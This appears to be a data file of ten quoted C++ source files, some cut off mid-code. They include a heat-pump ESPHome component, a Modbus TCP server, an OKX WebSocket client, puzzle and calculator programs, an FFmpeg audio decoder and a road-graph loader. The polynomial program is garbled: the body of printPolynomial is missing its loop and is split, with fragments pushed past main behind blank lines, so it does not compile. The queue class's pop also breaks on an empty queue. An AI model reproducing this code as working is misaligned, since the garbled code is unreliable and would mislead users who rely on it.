    "#include \"ecodan.h\"\r\n\r\nnamespace esphome {\r\nnamespace ecodan \r\n{ \r\n    void EcodanHeatpump::setup() {\r\n        heatpumpInitialized = initialize();\r\n    }\r\n\r\n    void EcodanHeatpump::set_room_thermostat_current_temp(float temp, uint8_t room) {\r\n        if (temp != NAN && room < 8 && room >= 0) {\r\n            status.CurrentRoomTemperatures[room] = temp;\r\n        }\r\n        else {\r\n            status.CurrentRoomTemperatures[room] = 0xff;\r\n        }\r\n    }    \r\n\r\n    void EcodanHeatpump::publish_state(const std::string& sensorKey, float sensorValue) {\r\n        auto sensor_it = sensors.find(sensorKey);\r\n        if (sensor_it != sensors.end()) {\r\n            sensor_it->second->publish_state(sensorValue);\r\n        } \r\n        else \r\n        {\r\n            ESP_LOGI(TAG, \"Could not publish state of sensor '%s' with value: '%f'\", sensorKey.c_str(), sensorValue);\r\n        }\r\n    }\r\n\r\n    void EcodanHeatpump::publish_state(const std::string& sensorKey, const std::string& sensorValue) {        \r\n        auto textSensor_it = textSensors.find(sensorKey);\r\n        if (textSensor_it != textSensors.end()) {\r\n            textSensor_it->second->publish_state(sensorValue);\r\n        }\r\n        else \r\n        {\r\n            ESP_LOGI(TAG, \"Could not publish state of sensor '%s' with value: '%s'\", sensorKey.c_str(), sensorValue.c_str());\r\n        }\r\n    }\r\n\r\n    void EcodanHeatpump::publish_state(const std::string& sensorKey, bool sensorValue) {\r\n        auto binarySensor_it = binarySensors.find(sensorKey);\r\n        if (binarySensor_it != binarySensors.end()) {\r\n            binarySensor_it->second->publish_state(sensorValue);\r\n        }\r\n        else \r\n        {\r\n            ESP_LOGI(TAG, \"Could not publish state of sensor '%s' with value: '%d'\", sensorKey.c_str(), sensorValue);\r\n        }\r\n    }\r\n\r\n    void EcodanHeatpump::update() {        \r\n        if (heatpumpInitialized)\r\n            handle_loop();            \r\n    }\r\n\r\n    void EcodanHeatpump::dump_config() {\r\n        ESP_LOGI(TAG, \"config\"); \r\n    }\r\n\r\n    bool EcodanHeatpump::initialize()\r\n    {\r\n        if (!uart_) {\r\n            ESP_LOGE(TAG, \"No UART configured\");\r\n            return false;\r\n        }\r\n\r\n        ESP_LOGI(TAG, \"Initializing HeatPump using UART %p, proxy %p\", uart_, proxy_uart_);\r\n \r\n        if (uart_->get_baud_rate() != 2400 ||\r\n            uart_->get_stop_bits() != 1 ||\r\n            uart_->get_data_bits() != 8 ||\r\n            uart_->get_parity() != uart::UART_CONFIG_PARITY_EVEN) {\r\n            ESP_LOGI(TAG, \"UART not configured for 2400 8E1. This may not work...\");\r\n        }\r\n\r\n        if (proxy_uart_) {    \r\n            if ((proxy_uart_->get_baud_rate() != 2400 && proxy_uart_->get_baud_rate() != 9600) ||\r\n                proxy_uart_->get_stop_bits() != 1 ||\r\n                proxy_uart_->get_data_bits() != 8 ||\r\n                proxy_uart_->get_parity() != uart::UART_CONFIG_PARITY_EVEN) {\r\n                ESP_LOGI(TAG, \"Proxy UART not configured for 2400/9600 8E1. This may not work...\");\r\n            }            \r\n        }\r\n        else if (!is_connected()){\r\n            begin_connect();\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    void EcodanHeatpump::loop()\r\n    {\r\n        static auto last_response = std::chrono::steady_clock::now();\r\n\r\n        if (proxy_uart_ && proxy_uart_->available() > 0) {\r\n            proxy_ping();\r\n            if (serial_rx(proxy_uart_, proxy_buffer_, true))\r\n            {\r\n                // forward cmds from slave to master\r\n                if (uart_)\r\n                    uart_->write_array(proxy_buffer_.buffer(), proxy_buffer_.size());\r\n                proxy_buffer_ = Message();    \r\n            }\r\n\r\n            // if we could not get the sync byte after 4*packet size attemp, we are probably using the wrong baud rate\r\n            if (rx_sync_fail_count > 4*16) {\r\n                //swap 9600 <-> 2400\r\n                int current_baud = proxy_uart_->get_baud_rate(); \r\n                int new_baud =  current_baud == 2400 ? 9600 : 2400;\r\n                ESP_LOGE(TAG, \"Could not get sync byte, swapping baud from '%d' to '%d' for slave...\", current_baud, new_baud);\r\n                proxy_uart_->flush();\r\n                proxy_uart_->set_baud_rate(new_baud);\r\n                proxy_uart_->load_settings();\r\n                \r\n                // reset fail count\r\n                rx_sync_fail_count = 0;\r\n            }\r\n        }\r\n\r\n        if (serial_rx(uart_, res_buffer_))\r\n        {\r\n            last_response = std::chrono::steady_clock::now();\r\n            if (proxy_available())\r\n                proxy_uart_->write_array(res_buffer_.buffer(), res_buffer_.size());\r\n            \r\n            // interpret message\r\n            \r\n            //ESP_LOGE(TAG, res_buffer_.debug_dump_packet().c_str());\r\n            handle_response(res_buffer_);\r\n            res_buffer_ = Message();\r\n        }\r\n\r\n        auto now = std::chrono::steady_clock::now();\r\n        if (now - last_response > std::chrono::minutes(2))\r\n        {\r\n            last_re",
    "#include <QCoreApplication>\n#include <QDebug>\n#include <QtNetwork/QHostAddress>\n\n#include <QRandomGenerator>\n#include <QTimer>\n#include <QtSerialBus/QModbusTcpServer>\n\n// MAIN del Esclavo (servidor) Modbus TCP\nint main(int argc, char *argv[])\n{\n    QCoreApplication a(argc, argv);\n\n    // Creamos el servidor Modbus TCP\n    QModbusTcpServer server;\n\n    // Asignamos par\u00e1metros de conexi\u00f3n:\n    server.setConnectionParameter(QModbusDevice::NetworkAddressParameter, \"0.0.0.0\");\n    server.setConnectionParameter(QModbusDevice::NetworkPortParameter, 1502);\n\n    // Iniciamos el servidor\n    if (!server.connectDevice()) {\n        qWarning() << \"No se pudo iniciar el servidor Modbus TCP\";\n        return -1;\n    }\n\n    // Por compatibilidad con Modbus, podr\u00edamos asignar un ID\n    // (en Modbus TCP no suele ser crucial, pero se puede usar).\n    server.setServerAddress(1);\n\n    // --------------------------------------------\n    // Definir el mapa de registros (por ejemplo, Holding Registers de 0 a 9)\n    QModbusDataUnitMap regMap;\n    QModbusDataUnit hrUnit(QModbusDataUnit::HoldingRegisters, 0, 10);\n    regMap.insert(QModbusDataUnit::HoldingRegisters, hrUnit);\n\n    if (!server.setMap(regMap)) {\n        qWarning() << \"Error al configurar mapa de registros en el servidor TCP\";\n        return -1;\n    }\n\n    // Inicializamos valores (temperatura en direcci\u00f3n 0, LED en direcci\u00f3n 1)\n    server.setData(QModbusDataUnit::HoldingRegisters, 0, 25); // Temperatura inicial\n    server.setData(QModbusDataUnit::HoldingRegisters, 1, 0);  // LED apagado\n\n    // Cuando el maestro escriba un registro, comprobamos si escribi\u00f3 el LED.\n    QObject::connect(&server,\n                     &QModbusServer::dataWritten,\n                     [&](QModbusDataUnit::RegisterType table, int address, int size) {\n                         if (table == QModbusDataUnit::HoldingRegisters && address == 1\n                             && size == 1) {\n                             quint16 ledVal = 0;\n                             if (server.data(QModbusDataUnit::HoldingRegisters, 1, &ledVal)) {\n                                 qDebug()\n                                     << \"[Servidor] El LED ha sido escrito con valor:\" << ledVal;\n                             }\n                         }\n                     });\n\n    // Simulamos una temperatura aleatoria cada 3s y la actualizamos en HR[0]\n    QTimer tempTimer;\n    QObject::connect(&tempTimer, &QTimer::timeout, [&]() {\n        int newTemp = 20 + QRandomGenerator::global()->bounded(15); // 20..34\n        server.setData(QModbusDataUnit::HoldingRegisters, 0, newTemp);\n        qDebug() << \"[Servidor] Temperatura simulada =\" << newTemp << \"\u00b0C\";\n    });\n    tempTimer.start(3000);\n\n    qDebug() << \"Servidor Modbus TCP iniciado en puerto 1502 (slave address=1)\";\n\n    return a.exec();\n}\n",
    "/**\r\nOKX Futures WebSocket Client\r\n\r\nLicensed under the MIT License <http://opensource.org/licenses/MIT>.\r\nSPDX-License-Identifier: MIT\r\nCopyright (c) 2025 Vitezslav Kot <vitezslav.kot@gmail.com>.\r\n*/\r\n\r\n#include \"vk/okx/okx_futures_ws_client.h\"\r\n#include <boost/beast/core.hpp>\r\n#include <thread>\r\n#include <fmt/format.h>\r\n\r\nusing namespace std::chrono_literals;\r\n\r\nnamespace vk::okx::futures {\r\n#define STRINGIZE_I(x) #x\r\n#define STRINGIZE(x) STRINGIZE_I(x)\r\n\r\n#define MAKE_FILELINE \\\r\n    __FILE__ \"(\" STRINGIZE(__LINE__) \")\"\r\n\r\nstatic auto OKX_FUTURES_WS_HOST = \"wsaws.okx.com\";\r\nstatic auto OKX_FUTURES_WS_PORT = \"8443\";\r\n\r\nstruct WebSocketClient::P {\r\n    boost::asio::io_context m_ioContext;\r\n    boost::asio::ssl::context m_ctx;\r\n    std::string m_host = {OKX_FUTURES_WS_HOST};\r\n    std::string m_port = {OKX_FUTURES_WS_PORT};\r\n    std::weak_ptr<WebSocketSession> m_session;\r\n    std::thread m_ioThread;\r\n    std::atomic<bool> m_isRunning = false;\r\n    onLogMessage m_logMessageCB;\r\n    onDataEvent m_dataEventCB;\r\n\r\n    P() : m_ctx(boost::asio::ssl::context::sslv23_client) {\r\n    }\r\n};\r\n\r\nWebSocketClient::WebSocketClient() : m_p(std::make_unique<P>()) {\r\n}\r\n\r\nWebSocketClient::~WebSocketClient() {\r\n    m_p->m_ioContext.stop();\r\n\r\n    if (m_p->m_ioThread.joinable()) {\r\n        m_p->m_ioThread.join();\r\n    }\r\n}\r\n\r\nvoid WebSocketClient::run() const {\r\n    if (m_p->m_isRunning) {\r\n        return;\r\n    }\r\n\r\n    m_p->m_isRunning = true;\r\n\r\n    if (m_p->m_ioThread.joinable()) {\r\n        m_p->m_ioThread.join();\r\n    }\r\n\r\n    m_p->m_ioThread = std::thread([&] {\r\n        for (;;) {\r\n            try {\r\n                m_p->m_isRunning = true;\r\n\r\n                if (m_p->m_ioContext.stopped()) {\r\n                    m_p->m_ioContext.restart();\r\n                }\r\n                m_p->m_ioContext.run();\r\n                m_p->m_isRunning = false;\r\n                break;\r\n            } catch (std::exception &e) {\r\n                if (m_p->m_logMessageCB) {\r\n                    m_p->m_logMessageCB(LogSeverity::Error, fmt::format(\"{}: {}\\n\", MAKE_FILELINE, e.what()));\r\n                }\r\n            }\r\n        }\r\n\r\n        m_p->m_isRunning = false;\r\n    });\r\n}\r\n\r\nvoid WebSocketClient::setLoggerCallback(const onLogMessage &onLogMessageCB) const {\r\n    m_p->m_logMessageCB = onLogMessageCB;\r\n}\r\n\r\nvoid WebSocketClient::setDataEventCallback(const onDataEvent &onDataEventCB) const {\r\n    m_p->m_dataEventCB = onDataEventCB;\r\n}\r\n\r\nvoid WebSocketClient::subscribe(const std::string &subscriptionRequest) const {\r\n    if (const auto session = m_p->m_session.lock()) {\r\n        session->subscribe(subscriptionRequest);\r\n        return;\r\n    }\r\n\r\n    const auto ws = std::make_shared<WebSocketSession>(m_p->m_ioContext, m_p->m_ctx, m_p->m_logMessageCB);\r\n    std::weak_ptr wp{ws};\r\n    m_p->m_session = std::move(wp);\r\n    ws->run(OKX_FUTURES_WS_HOST, OKX_FUTURES_WS_PORT, subscriptionRequest, m_p->m_dataEventCB);\r\n}\r\n\r\nbool WebSocketClient::isSubscribed(const std::string &subscriptionRequest) const {\r\n    if (const auto session = m_p->m_session.lock()) {\r\n        return session->isSubscribed(subscriptionRequest);\r\n    }\r\n\r\n    return false;\r\n}\r\n}\r\n",
    "#include <iostream>\n#include \"Problem.h\"\n\nusing namespace std;\n\n// overload output operator for a Node\n\nint main()\n{\n    int user_initial_state;\n    int userAlgorithmChoice;\n\n    // below is if user wants default puzzle. Only modify it if they select option \"2\"\n    int temp_initial[3][3] =\n        {\n            {1, 2, 3},\n            {4, 8, 0},\n            {7, 6, 5}};\n\n    // welcome the user\n    cout << \"\\nWelcome to Ghunaim and Kethidi's 8 puzzle solver.\" << endl;\n    cout << \"Type \\\"1\\\" to enter your own puzzle, or \\\"2\\\" to use a default puzzle: \";\n    cin >> user_initial_state;\n    cout << endl;\n\n    if (user_initial_state == 1)\n    {\n        // create or change array to users array\n        cout << \"\\nEnter your puzzle, using zero to represent the blank tile:\\n\"\n             << endl;\n        for (int i = 0; i < 3; i++)\n        {\n            cout << \"Enter row \" << i << \", using a space between numbers. Hit enter once done: \";\n            for (int j = 0; j < 3; j++)\n            {\n                cin >> temp_initial[i][j];\n            }\n            // cout << endl;\n        }\n        cout << \"\\nYour puzzle: \"\n             << endl;\n    }\n    else\n    {\n        cout << \"Using default puzzle: \"\n             << endl;\n    }\n    // for testing: printing resulting matrix\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << temp_initial[i][j] << \" \";\n        }\n        cout << endl;\n    }\n    cout << endl;\n\n    // ask user what search algorithm they want\n    cout << \"Enter your choice of algorithm\" << endl;\n    cout << \"Type \\\"1\\\" for Uniform Cost Search\" << endl;\n    cout << \"Type \\\"2\\\" for A* with the Misplaced Tile heuristic\" << endl;\n    cout << \"Type \\\"3\\\" for A* with the Euclidean distance heuristic\" << endl;\n    cin >> userAlgorithmChoice;\n\n    if (!((userAlgorithmChoice == 1) || (userAlgorithmChoice == 2) || (userAlgorithmChoice == 3)))\n    {\n        cout << \"\\nInvalid algorithm choice.\";\n        userAlgorithmChoice = 1;\n    }\n\n    // do we need edge case for this too?? i dont want to\n    switch (userAlgorithmChoice)\n    {\n    case 1:\n        cout << \"\\nPerforming Uniform Cost Search on your puzzle...\" << endl;\n        break;\n    case 2:\n        // uncomment below once function implemented\n        cout << \"\\nPerforming A* with the Misplaced Tile heuristic on your puzzle...\" << endl;\n\n        // comment out below 2 lines once function implemented\n        // cout << \"\\nA* with the Misplaced Tile under construction! Doing uniform cost search...\" << endl;\n        // userAlgorithmChoice = 1;\n        break;\n    case 3:\n        // uncomment below once function implemented\n        cout << \"\\nPerforming A* with the Euclidean distance heuristic on your puzzle...\" << endl;\n\n        // comment out below 2 lines once function implemented\n        // cout << \"\\nA* with the Euclidean distance under construction! Doing uniform cost search...\" << endl;\n        // userAlgorithmChoice = 1;\n\n        break;\n    }\n\n    // now, we can make the problem and perform our search on the problem\n    Problem problem(userAlgorithmChoice, temp_initial);\n    problem.search();\n    problem.trace();\n\n    return 0;\n}",
    "#include \"TokenProcessor.hpp\"\n#include \"Constants.hpp\"\n#include <cctype>\n#include <algorithm>\n\nnamespace calc {\n    std::vector<Token> TokenProcessor::tokenize(std::string_view expression) {\n    std::vector<Token> tokens;\n    tokens.reserve(expression.length() / 2);\n\n    std::string_view remaining = expression;\n    while (!remaining.empty()) {\n        char c = remaining.front();\n\n        // Skip whitespace\n        if (std::isspace(c)) {\n            remaining.remove_prefix(1);\n            continue;\n        }\n\n        // Handle neg numbers\n        if(c == '-' && remaining.length() > 1 && \n           (std::isdigit(remaining[1]) || remaining[1] == '.') &&\n           (tokens.empty() || tokens.back().getType() == Token::Type::Operator ||\n           (tokens.back().getType() == Token::Type::Bracket && tokens.back().getValue() == \"(\"))) {\n            remaining.remove_prefix(1);\n            if (auto numToken = parseNumber(remaining)) {\n                tokens.emplace_back(Token::Type::Number, \"-\" + numToken->getValue());\n                continue;\n            }\n            remaining = std::string_view(remaining.data() - 1, remaining.length() + 1);\n        }\n\n        // Handle pos numbers\n        if (auto numToken = parseNumber(remaining)) {\n            if (!tokens.empty() && tokens.back().getType() == Token::Type::Bracket && \n                tokens.back().getValue() == \")\") {\n                tokens.emplace_back(Token::Type::Operator, \"*\");  \n            }\n            tokens.emplace_back(std::move(*numToken));\n            continue;\n        }\n\n        // Handle words (functions, constants, variables)\n        if(std::isalpha(c)) {\n            if (!tokens.empty() && tokens.back().getType() == Token::Type::Bracket && \n                tokens.back().getValue() == \")\") {\n                tokens.emplace_back(Token::Type::Operator, \"*\");\n            }\n            handleWord(remaining, tokens);\n            continue;\n        }\n\n        // Handle operators\n        if(isOperator(c)) {\n            // Always allow operators after closing parentheses, constants, numbers\n            if(c == '-' && remaining.length() > 1 && remaining[1] == '(' &&\n               (tokens.empty() || tokens.back().getType() == Token::Type::Operator ||\n               (tokens.back().getType() == Token::Type::Bracket && tokens.back().getValue() == \"(\"))) {\n                tokens.emplace_back(Token::Type::Number, \"-1\");\n                tokens.emplace_back(Token::Type::Operator, \"*\");\n                remaining.remove_prefix(1);\n                continue;\n            }\n            tokens.emplace_back(Token::Type::Operator, std::string(1,c));\n            remaining.remove_prefix(1);\n            continue;\n        } \n\n        // Handle brackets\n        if(c == '(' || c == ')') {  \n            if (!tokens.empty() && c == '(' && \n               (tokens.back().getType() == Token::Type::Number || \n                tokens.back().getType() == Token::Type::Constant || \n                tokens.back().getType() == Token::Type::Variable ||\n                tokens.back().getType() == Token::Type::PrevResult ||\n                (tokens.back().getType() == Token::Type::Bracket && \n                 tokens.back().getValue() == \")\")\n               )) {\n                tokens.emplace_back(Token::Type::Operator, \"*\");\n            }\n            tokens.emplace_back(Token::Type::Bracket, std::string(1,c));\n            remaining.remove_prefix(1);\n            continue;\n        }\n\n        // Skip whitespace at the end\n        if (!std::isspace(c)) {\n            throw CalcError(\"Invalid character in Expression\");\n        }\n        remaining.remove_prefix(1);\n    }\n    return tokens;\n}\n\n    std::optional<Token> TokenProcessor::parseNumber(std::string_view& input) {\n        size_t idx = 0;\n        bool hasDecimal = false; \n\n        while (idx < input.length() &&\n            (std::isdigit(input[idx]) || (!hasDecimal && input[idx] == '.'))) {\n                if (input[idx] == '.') hasDecimal = true;\n                idx++;\n        }\n\n        if (idx == 0) {\n            return std::nullopt;\n        }\n\n        std::string number(input.substr(0, idx));\n        input.remove_prefix(idx);\n        return Token(Token::Type::Number, std::move(number));\n    }\n\n    void TokenProcessor::handleWord(std::string_view& input, std::vector<Token>& tokens) {\n        size_t idx = 0;\n        \n        while (idx < input.length() && std::isalnum(input[idx])) {\n            idx++;\n        }\n\n        std::string word(input.substr(0, idx));\n        std::transform(word.begin(), word.end(), word.begin(), ::tolower);\n\n        Token::Type type;\n        if (word == \"pi\" || word == \"e\" || word == \"phi\" || word == \"sqrt2\") \n            type = Token::Type::Constant;\n        else if(word == \"ans\") \n            type = Token::Type::PrevResult;\n        else if (word == \"def\" || word == \"del\" || word == \"upd\" || word == \"ls\") \n            type = Token::Type::Command;\n        else if (word == \"sin\" || word == \"cos\" || word == \"tan\" || \n       ",
    "//========= Copyright Valve Corporation, All rights reserved. ============//\n//\n// Purpose: Fast ways to compare equality of two floats.  Assumes \n// sizeof(float) == sizeof(int) and we are using IEEE format.\n//\n// Source:  http://www.cygnus-software.com/papers/comparingfloats/comparingfloats.htm\n//=====================================================================================//\n\n#include <float.h>\n#include <math.h>\n\n#include \"mathlib/mathlib.h\"\n\nstatic inline bool AE_IsInfinite(float a)\n{\n    const int kInfAsInt = 0x7F800000;\n\n    // An infinity has an exponent of 255 (shift left 23 positions) and\n    // a zero mantissa. There are two infinities - positive and negative.\n    if ((*(int*)&a & 0x7FFFFFFF) == kInfAsInt)\n        return true;\n    return false;\n}\n\nstatic inline bool AE_IsNan(float a)\n{\n    // a NAN has an exponent of 255 (shifted left 23 positions) and\n    // a non-zero mantissa.\n    int exp = *(int*)&a & 0x7F800000;\n    int mantissa = *(int*)&a & 0x007FFFFF;\n    if (exp == 0x7F800000 && mantissa != 0)\n        return true;\n    return false;\n}\n\nstatic inline int AE_Sign(float a)\n{\n    // The sign bit of a number is the high bit.\n    return (*(int*)&a) & 0x80000000;\n}\n\n// This is the 'final' version of the AlmostEqualUlps function.\n// The optional checks are included for completeness, but in many\n// cases they are not necessary, or even not desirable.\nbool AlmostEqual(float a, float b, int maxUlps)\n{\n    // There are several optional checks that you can do, depending\n    // on what behavior you want from your floating point comparisons.\n    // These checks should not be necessary and they are included\n    // mainly for completeness.\n\n    // If a or b are infinity (positive or negative) then\n    // only return true if they are exactly equal to each other -\n    // that is, if they are both infinities of the same sign.\n    // This check is only needed if you will be generating\n    // infinities and you don't want them 'close' to numbers\n    // near FLT_MAX.\n    if (AE_IsInfinite(a) || AE_IsInfinite(b))\n        return a == b;\n\n    // If a or b are a NAN, return false. NANs are equal to nothing,\n    // not even themselves.\n    // This check is only needed if you will be generating NANs\n    // and you use a maxUlps greater than 4 million or you want to\n    // ensure that a NAN does not equal itself.\n    if (AE_IsNan(a) || AE_IsNan(b))\n        return false;\n\n    // After adjusting floats so their representations are lexicographically\n    // ordered as twos-complement integers a very small positive number\n    // will compare as 'close' to a very small negative number. If this is\n    // not desireable, and if you are on a platform that supports\n    // subnormals (which is the only place the problem can show up) then\n    // you need this check.\n    // The check for a == b is because zero and negative zero have different\n    // signs but are equal to each other.\n    if (AE_Sign(a) != AE_Sign(b))\n        return a == b;\n\n    int aInt = *(int*)&a;\n    // Make aInt lexicographically ordered as a twos-complement int\n    if (aInt < 0)\n        aInt = 0x80000000 - aInt;\n    // Make bInt lexicographically ordered as a twos-complement int\n    int bInt = *(int*)&b;\n    if (bInt < 0)\n        bInt = 0x80000000 - bInt;\n\n    // Now we can compare aInt and bInt to find out how far apart a and b\n    // are.\n    int intDiff = abs(aInt - bInt);\n    if (intDiff <= maxUlps)\n        return true;\n    return false;\n}\n\n\n",
    "#include <iostream>\r\n#include <map>\r\nusing namespace std;\r\n\r\n// Function to add two polynomials\r\nmap<int, int> addPolynomials(const map<int, int>& p1, const map<int, int>& p2) {\r\n    map<int, int> result = p1;\r\n    for (const auto& term : p2) {\r\n      result[term.first] += term.second;\r\n    }\r\n    return result;\r\n}\r\n\r\n// Function to subtract two polynomials\r\nmap<int, int> subtractPolynomials(const map<int, int>& p1, const map<int, int>& p2) {\r\n    map<int, int> result = p1;\r\n    for (const auto& term : p2) {\r\n    \t   result[term.first] -= term.second;\r\n    }\r\n    return result;\r\n}// Function to multiply two polynomials\r\nmap<int, int> multiplyPolynomials(const map<int, int>& p1, const map<int, int>& p2) {\r\n    map<int, int> result;\r\n     for (const auto& term1 : p1) {\r\n        for (const auto& term2 : p2) {\r\n            int degree = term1.first + term2.first;int coefficient = term1.second * term2.second;\r\n            result[degree] += coefficient;\r\n        } }\r\n    return result;\r\n    \r\n}// Function to display a polynomial\r\nvoid printPolynomial(const map<int, int>& poly) {\r\n    bool first = true; else if (it->second < 0) cout << \" - \"; if (it->first > 0) cout << \"x\";\r\n        if (it->first > 1) cout << \"^\" << it->first;\r\n\r\n        first = false; }\r\n    if (first) cout << \"0\"; // In case all coefficients are zero\r\n    cout << endl;\r\n    }\r\n\r\nint main() {\r\n    // Define polynomials\r\n     map<int, int> p1 = {{2, 3}, {1, 2}, {0, 1}}; // 3x^2 + 2x + 1\r\n    map<int, int> p2 = {{1, 1}, {0, 1}};         // x + 1\r\n\r\n    // Add polynomials\r\n     map<int, int> sum = addPolynomials(p1, p2);\r\n    cout << \"Addition: \";\r\n    printPolynomial(sum);\r\n      // Subtract polynomials\r\n    map<int, int> diff = subtractPolynomials(p1, p2);\r\n    cout << \"Subtraction: \";\r\n    printPolynomial(diff);// Multiply polynomials\r\n    map<int, int> product = multiplyPolynomials(p1, p2);\r\n    cout << \"Multiplication: \";\r\n     printPolynomial(product);\r\n\r\n    return 0;\r\n}\r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n    \r\n\r\n        if (abs(it->second) != 1 || it->first == 0)\r\n            cout << abs(it->second);",
    "//\n// Created by 10484 on 25-1-4.\n//\n\n#include \"deCodecContext.h\"\n#include \"formatContext.h\"\n#include \"packet.h\"\n#include \"utils.h\"\n#include \"frame.h\"\n#include \"frameConverter.h\"\n\n#include <cstdio>\n\n\nint main(int argc, char **argv)\n{\n\tif (argc != 3)\n\t{\n\t\tprintf(\"usage: %s <audio input file> <pcm output file>\\n\", argv[0]);\n\t\treturn -1;\n\t}\n\n\tprintErrMsg(__FUNCTION__, __LINE__, 0);\n\n\t// \u6253\u5f00\u8f93\u5165\u6587\u4ef6\n\tformatContext ifmtctx(argv[1]);\n\n\t// \u6253\u5370\u8f93\u5165\u6587\u4ef6\u4fe1\u606f\n\tifmtctx.dump();\n\n\t// \u521b\u5efa\u5e76\u6253\u5f00\u97f3\u9891\u89e3\u7801\u5668\n\tdeCodecContext ade_ctx(ifmtctx.audioStream());\n\n\t// \u521b\u5efa\u97f3\u9891\u89e3\u7801\u5668\n\tframeConverter aconv(audioConvertConfig{\n\t\tifmtctx.audioStream().channels(),\n\t\tstatic_cast<AVSampleFormat>(ifmtctx.audioStream().format()),\n\t\tifmtctx.audioStream().sampleRate(),\n\t\tifmtctx.audioStream().channels(),\n\t\tAV_SAMPLE_FMT_S16,\n\t\tifmtctx.audioStream().sampleRate()\n\t});\n\n\t// \u521b\u5efa\u8f93\u51fa\u6587\u4ef6\n\tFILE *fp = fopen(argv[2], \"wb\");\n\tif (fp == nullptr)\n\t{\n\t\tprintErrMsg(__FUNCTION__, __LINE__, -1);\n\t}\n\n\tpacket pkt;\n\tframe iaframe;\n\tint nb_samples = ifmtctx.audioStream().samples();\n\tframe oaframe(nb_samples,\n\t\t\t\t  ifmtctx.audioStream().channels(),\n\t\t\t\t  AV_SAMPLE_FMT_S16\n\t);\n\n\t// \u8bfb\u53d6\n\twhile (0 == ifmtctx.read(pkt))\n\t{\n\t\t// \u97f3\u9891\u5e27\n\t\tif (pkt.streamIndex() == ifmtctx.audioStream().index())\n\t\t{\n\t\t\tade_ctx.send(pkt);\n\t\t\tif (0 == ade_ctx.receive(iaframe))\n\t\t\t{\n\t\t\t\taconv.convert(iaframe, oaframe);\n\n\t\t\t\tint dst_bufsize = oaframe.bufferSize();\n\t\t\t\tfwrite(oaframe.data(0), 1, dst_bufsize, fp);\n\t\t\t}\n\t\t}\n\n\t\t// \u6e05\u7a7apacket\n\t\tpkt.unref();\n\t}\n\n\tfclose(fp);\n\n\tprintf(\"audio sample rate: %d\\n\", ifmtctx.audioStream().sampleRate());\n\tprintf(\"audio channels: %d\\n\", ifmtctx.audioStream().channels());\n\tprintf(\"audio format: %s\\n\", sampleFormat2Str(AV_SAMPLE_FMT_S16));\n\tprintf(\"test cmd: %s\\n\",\n\t\t   \"ffplay -ar 48000 -ac 2 -f s16le out_48000_2_s16le.pcm\");\n\n\treturn 0;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\ntemplate<typename T>\r\nclass queueNode{\r\n    public:\r\n    T val;\r\n    queueNode<T>* next;\r\n    queueNode<T>* previos;\r\n    queueNode(T param){\r\n        val = param;\r\n        next = nullptr;\r\n        previos = nullptr;\r\n    }\r\n};\r\n\r\ntemplate<typename T>\r\nclass queue{\r\n    private:\r\n    queueNode<T>* begin;\r\n    queueNode<T>* end;\r\n\r\n    public:\r\n    queue(){\r\n        this->begin = nullptr;\r\n        this->end = nullptr;\r\n    }\r\n\r\n    bool empty(){\r\n        return begin==nullptr;\r\n    }\r\n\r\n    void push(T param){\r\n        queueNode<T>* newEnd = new queueNode<T>(param);\r\n        newEnd->previos = end;\r\n        if(this->empty() == true){\r\n            this->begin = newEnd;\r\n        }\r\n        else{\r\n            end->next = newEnd;\r\n        }\r\n        this->end = newEnd;\r\n    }\r\n\r\n    queueNode<T>* peek(){\r\n        return this->begin;\r\n    }\r\n\r\n    void pop(){\r\n        if(!this->empty()){\r\n            if (begin->next != nullptr){\r\n                begin->next->previos = nullptr;\r\n            }\r\n        }\r\n        this->begin = begin->next;\r\n    }\r\n};\r\n\r\nint main(){\r\n    queue<int> a;\r\n    a.push(1);\r\n    a.push(2);\r\n    a.push(3);\r\n    a.pop();\r\n    a.pop();\r\n    cout << a.peek()->val;\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include <unordered_map>\n#include <thread>\n#include <chrono>\n#ifdef _WIN32\n#include <Windows.h>\n#else\n#include <unistd.h>\n#endif\n\nusing namespace std;\nusing namespace std::chrono;\n\nbool ended = false;\nvoid getData();\nvoid loadingCat();\n\nstruct Edge {\n    int to;\n    double time;\n};\n\nvoid wait(int time)\n{\n    #ifdef _WIN32\n    Sleep(time/1000);\n    #else\n    usleep(time);\n    #endif\n}\n\nifstream file;\nunordered_map<int, vector<Edge>> data_graph;\n\nunordered_map<int, vector<Edge>> loadDataset() {\n    string file_name = \"../USA-roads.csv\";\n\n    file.open(file_name);\n\n    if (!file.is_open()) {\n        cerr << \"Error opening file!\" << endl;\n        exit(EXIT_FAILURE);\n    }\n    \n    auto start = high_resolution_clock::now(); // get time\n\n    thread getDataThread(getData);\n\n    thread loadingCatThread(loadingCat);\n\n    loadingCatThread.join();\n    getDataThread.join();\n\n    auto stop = high_resolution_clock::now();\n    auto duration = duration_cast<seconds>(stop - start); // get task duration\n\n    cout << \"\\nLoaded in \" << duration.count() << \" seconds!\\n\" << endl;\n    return data_graph;\n}\n\nvoid getData()\n{\n    string line;\n    while (getline(file, line)) {\n        stringstream ss(line);\n        int from, to;\n        double time;\n        char comma;\n        ss >> from >> comma >> to >> comma >> time;\n\n        data_graph[from].push_back({to, time});\n        data_graph[to].push_back({from, time}); // Bidirectional connection\n    }\n    ended = true;\n}\n\nvoid loadingCat()\n{\n    cout << \"                   /\\\\_/\\\\\\n\" << flush;\n    while(!ended){\n        cout << \"Loading dataset.. / o.o \\\\\" << \"\\r\" << flush;\n        wait(1000000);\n        cout << \"Loading dataset.. / -.- \\\\\" << \"\\r\" << flush;\n        wait(150000);\n    }\n    cout << \"Dataset loaded!   / ^.^ \\\\\" << flush;\n}",
